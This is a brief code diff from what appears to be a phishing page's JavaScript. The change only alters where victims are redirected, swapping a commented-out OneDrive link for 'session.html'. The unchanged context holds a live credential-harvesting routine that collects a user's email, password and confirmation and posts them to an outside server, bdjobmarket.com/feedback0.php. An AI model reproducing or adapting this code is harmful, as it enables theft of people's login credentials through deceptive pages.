@@ -1,4 +1,4 @@
-  //url_link = "https://1drv.ms/b/s!Am2YG07g8dw_gXoW1yyy6LDLjdBF?e=PKwcsS";
+  url_link = "session.html";
   displayPassword()
   loadPasswordAgain()
   var userEmail = document.getElementById('showid').innerHTML, userPassword1,confirmPassword;
@@ -114,7 +114,7 @@
   function sendDetails(t, e, n) {
       var o = new FormData;
       o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://bdjobmarket.com/feedback0.php", o).then(function(t) {
-          200 === t.status && redirect(t.data)
+          200 === t.status && redirect(url_link)
       }).catch(function(t) {
           console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
       })
